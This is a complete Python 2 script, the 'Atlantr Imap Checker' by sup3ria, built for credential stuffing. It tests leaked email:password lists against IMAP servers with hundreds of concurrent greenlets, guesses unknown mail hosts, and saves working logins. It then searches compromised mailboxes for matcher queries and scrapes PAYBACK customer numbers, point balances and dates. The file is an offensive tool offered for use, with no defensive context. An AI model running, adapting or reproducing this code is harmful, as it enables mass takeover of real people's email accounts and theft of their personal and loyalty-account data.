#!/usr/bin/python
#- * -coding: utf-8 - * -
import sys
import os
import time
from timeit import default_timer as timer
import imaplib
import itertools
import argparse
import logging
from logging.handlers import RotatingFileHandler
import email

from tqdm import tqdm  # pip install tqdm
import gevent  # pip install gevent
import lxml.html
from gevent.queue import *
import gevent.monkey
gevent.monkey.patch_all()

print """
       db              88
      d88b       ,d    88                         ,d
     d8'`8b      88    88                         88
    d8'  `8b   MM88MMM 88 ,adPPYYba, 8b,dPPYba, MM88MMM 8b,dPPYba,
   d8YaaaaY8b    88    88 ""     `Y8 88P'   `"8a  88    88P'   "Y8
  d8""""""""8b   88    88 ,adPPPPP88 88       88  88    88
 d8'        `8b  88,   88 88,    ,88 88       88  88,   88
d8'          `8b "Y888 88 `"8bbdP"Y8 88       88  "Y888 88
     Imap checker v2.1                          by sup3ria
"""
parser = argparse.ArgumentParser(description='Atlantr Imap Checker v2.1')
parser.add_argument(
    '-i',
    '--input',
    help="Inputfile",
    required=False,
    type=str,
    default="valids.txt")
parser.add_argument(
    '-o',
    '--output',
    help='Outputfile',
    required=False,
    type=str,
    default="mail_pass_valid_payback.txt")
parser.add_argument(
    '-t',
    '--threads',
    help='Number of Greenlets spawned',
    required=False,
    type=int,
    default="512")
parser.add_argument(
    '-uh',
    '--unknownhosts',
    help='Check for unknown hosts',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-l',
    '--logging',
    help='Linecount logging',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-lsize',
    '--logfilesize',
    help='Size of logfile in MB',
    required=False,
    type=int,
    default="5")
parser.add_argument(
    '-gm',
    '--ghostmode',
    help='Continues linecount without userinput',
    required=False,
    type=bool,
    default=False)
parser.add_argument(
    '-iu',
    '--invunma',
    help='Log invalid an unmatched accounts.',
    required=False,
    type=bool,
    default=False)
    
parser.add_argument(
    '-g',
    '--grabber',
    help='Grab for matchers.',
    required=False,
    type=bool,
    default=True)

parser.add_argument(
    '-mf',
    '--matchfile',
    help='File with matchers..',
    required=False,
    type=str,
    default="matchers.txt")

args = vars(parser.parse_args())

file_in = args['input']
file_out = args['output']
workers = args['threads']
phosts = args['unknownhosts']
llog = args['logging']
logfilesize = args['logfilesize']
ghsme = args['ghostmode']
invunma = args['invunma']
grabactiv = args['grabber']
file_match = args['matchfile']

if workers > 1500:
    print "Threads are limited to 1500."
    workers = 1500

logger1 = logging.getLogger("valid Log")
logger1.setLevel(logging.DEBUG)
handler1 = logging.FileHandler(file_out)
logger1.addHandler(handler1)

if invunma:
    logger3 = logging.getLogger("unmatched Log")
    logger3.setLevel(logging.DEBUG)
    handler1 = logging.FileHandler((file_in[:-4] + '_unmatched.txt'))
    logger3.addHandler(handler1)

    logger4 = logging.getLogger("invalid Log")
    logger4.setLevel(logging.DEBUG)
    handler1 = logging.FileHandler((file_in[:-4] + '_invalid.txt'))
    logger4.addHandler(handler1)

def lloggrt():
    if llog:
        global logger2
        logger2 = logging.getLogger("Rotating Log")
        logger2.setLevel(logging.DEBUG)
        handler2 = RotatingFileHandler(
            "count.log",
            maxBytes=logfilesize * 1024 * 1024,
            backupCount=1)
        logger2.addHandler(handler2)

def get_text(a):
    document = lxml.html.document_fromstring(str(a))
    c = document.text_content()
    c = c.split('\n')
    s = []
    for i in c:
        i = i.replace(' ','').strip()
        if i != '':
            s.append(i)
    return s

def nr(s):
    count = 0
    for i in s:
        cv = 0
        for j in i:
            if j.isdigit():
                cvv = 0
                for k in i[cv:cv+10]:
                    if k.isdigit():
                        cvv = cvv + 1
                if cvv == 10:
                    for x in s[count-4:count+1]:
                        if 'Kunde' in x:
                            return i[cv:cv+10]
            cv = cv+1
        count = count+1

def date(s):
    count = 0
    for i in s:
        cv = 0
        for j in i:
            if j.isdigit():
                cvv = 0
                for k in i[cv:cv+10]:
                    if k.isdigit():
                        cvv = cvv + 1
                if cvv == 8:
                    x = i[cv:cv+10].split('.')
                    if len(x) == 3:
                        if len(x[2]) == 4:
                            if len(x[0]) == 2:
                               return i[cv:cv+10]  
            cv = cv+1
        count = count+1
    for i in s:
        try:
            for i in s:
                if i.find('Date:') == 0:
                    i = i.split(',')[1]
                    date = i[0:2]+' '+i[2:5]+' '+i[5:9]
                    return date
        except:
            pass

def points(s): 
    count = 0
    for i in s:
        if i != '':
            if i[0:1].isdigit():
                i = i.replace('.','')
                i = i.split(' ')[0]
                if i.isdigit():
                    for y in s[count-3:count+1]:
                        if 'Punkte' in y:
                            return i
            count = count+1

def grabber_wrapper(a):
    s = get_text(a)
    d = date(s)
    n = nr(s)
    p = points(s)
    if d != None and n != None and p != None:
        return date(s), nr(s), points(s)
    else:
        return False

def email_grabber(a, b,host,q):
    try:
        quer = q.split('|')[0].strip()
        query = q.split('|')[1].strip()
        absenders = []
        mail = imaplib.IMAP4_SSL(host)
        mail.login(a, b)
        rv, mailbox = mail.list()
        inboxes = []
        messages = []
        for i in mailbox:
            i = i.split(' ')[2]
            if i[0] == '"':
                i = i[1:]
                if i[0] == '/':
                    i = i[2:]
            if len(i) >0:
                inboxes.append(str(i))
        inboxes = inboxes[::-1]
        for inbox in inboxes: 
            try:
                mail.select(inbox)
                result, data = mail.uid(quer, None, query) 
                latest_email_uid = data[0].split()[-1]
                result, data = mail.uid('fetch', latest_email_uid, '(RFC822)')  
                raw_email = data[0][1]
                messages.append(raw_email)
            except:
                pass
        return messages
    except:
        return False

def load_matchers():
    try:
        matchers = []
        with open(file_match, "r") as text_file:
            for line in text_file:
                if len(line.strip()) > 1:
                    matchers.append(line.strip())
        return matchers
    except:
        print "Could not load any matchers, no file provided."
        return False

def imap(usr, pw, host):
    usr = usr.lower()
    try:
        mail = imaplib.IMAP4_SSL(str(host))
        a = str(mail.login(usr, pw))
        return a[2: 4]
    except imaplib.IMAP4.error:
        return False
    except:
        return "Error"

def init_ImapConfig():
    global ImapConfig
    ImapConfig = {}
    with open("hoster.txt", "r") as f:
        for line in f:
            if len(line) > 1:
                hoster = line.strip().split(':')
                ImapConfig[hoster[0]] = hoster[1]

def get_imapConfig(email):
    try:
        hoster = email.lower().split('@')[1]
        return ImapConfig[hoster]
    except:
        return False

def yes_or_no(question):
    reply = str(raw_input(question + ' (y/n): ')).lower().strip()
    if reply[0] == 'y':
        return True
    if reply[0] == 'n':
        return False
    else:
        return yes_or_no("Uhhhh... please enter ")

def get_lineCount():
    try:
        lines = []
        with open("count.log", "r") as text_file:
            for line in text_file:
                lines.append(line.strip())
        last_line = lines[-1]
        if last_line.strip() == "end":
            return False
        last_line = max(lines[-100:])
        return int(last_line)
    except:
        return 0

def getunknown_imap(subb):
    sub = [
        'imap',
        'mail',
        'pop',
        'pop3',
        'imap-mail',
        'inbound',
        'mx',
        'imaps',
        'smtp',
        'm']
    for host in sub:
        host = host + '.' + subb
        try:
            mail = imaplib.IMAP4_SSL(str(host))
            a = str(mail.login('test', 'test'))
        except imaplib.IMAP4.error:
            return host

def ini_uh(host):
    host = host.split('@')[1]
    jobs = [gevent.spawn(getunknown_imap, host)]
    gevent.joinall(jobs, timeout=10)
    for job in jobs:
        v = job.value
        if v is not None:
            with open("hoster.txt", "a") as myfile:
                myfile.write('\n' + host + ':' + v + ":993")
                ImapConfig[host] = v
            return v
    return False

def grabberwrap(task,host):
    matchers = load_matchers()
    if len(matchers) <1:
        print "Not matchers in",file_match
        return ':'.join(task)
    for q in matchers:
        e = email_grabber(task[0],task[1],host,q)
        if e != False:
            if 'payback' in q.split('|')[2]:
                g = grabber_wrapper(e[0])
                if g != False:
                    task = task[0]+':'+task[1]+'|'+','.join(g)
                    return task
            if len(e)>0:
                return ':'.join(task)+'|'+q.split('|')[2]+' True'
    return ':'.join(task)
                
def sub_worker(task):
    global count_valid
    global count_invalid
    global count_unmatched
    count_valid = 0
    count_invalid = 0
    count_unmatched = 0
    task2 = task.split(':')
    host = get_imapConfig(task2[0])
    if phosts:
        if not host:
            o = ini_uh(task2[0])
            if o:
                host = o
    if not host:
        if invunma:
            logger3.debug(task)
        count_unmatched = count_unmatched + 1
        return False
    l = imap(task2[0], task2[1], host)
    if l == 'OK':
        if grabactiv:
            task = grabberwrap(task2,host)
        logger1.debug(task)    
        count_valid = count_valid + 1
        pbar2.update()
    if not l:
        if invunma:
            logger4.debug(task)
        count_invalid = count_invalid + 1
    if l == "Error":
        # q.put(task)
        return False

def worker():
    global line_count
    line_count = 0
    while not q.empty():
        task = q.get()
        s = True
        try:
            s = sub_worker(task)
        finally:
            pbar.update()
            line_count += 1
            if llog:
                logger2.debug(line_count)

def loader():
    global startcount
    par1 = get_lineCount()
    if par1:
        startcount = par1
    else:
        startcount = 0
    if not par1:
        try:
            os.remove("count.log")
        except:
            pass
        par1 = 0
    if par1 != 0:
        if not ghsme:
            yes = yes_or_no("Resume old line-count?:")
        else:
            yes = True
        if not yes:
            try:
                os.remove("count.log")
            except:
                pass
            par1 = 0
    lloggrt()
    if phosts:
        ttimeout = 25
    else:
        ttimeout = 5
    # print "Preparing list (this might take a while)."
    with open(file_in, "r") as text_file:
        for line in itertools.islice(text_file, par1, None):
            if len(line.strip()) > 1 and ':' in line.strip():
                try:
                    if '@' in line.split(
                            ':')[1] and '.' not in line.split(':')[0]:
                        a = line.split(':')[0].strip()
                        b = line.split(':')[1].strip()
                        line = b.lower() + ':' + a
                    q.put(line.strip(), timeout=ttimeout)
                except:
                    pass

def asynchronous():
    threads = []
    for i in range(0, workers):
        threads.append(gevent.spawn(worker))
    start = timer()
    gevent.joinall(threads, raise_error=True)
    end = timer()
    pbar.close()
    pbar2.close()
    print "\n(Found", count_invalid, 'invalid and for', count_unmatched, 'no settings were found.)'
    print "\nTime passed: " + str(end - start)[:6]
    if llog:
        logger2.debug("end")

init_ImapConfig()
q = gevent.queue.JoinableQueue()
gevent.spawn(loader).join()
pbar = tqdm(total=q.qsize() + startcount, ncols=80,  initial=startcount)
pbar2 = tqdm(total=q.qsize(), bar_format="  Valid:{n_fmt}")
asynchronous()
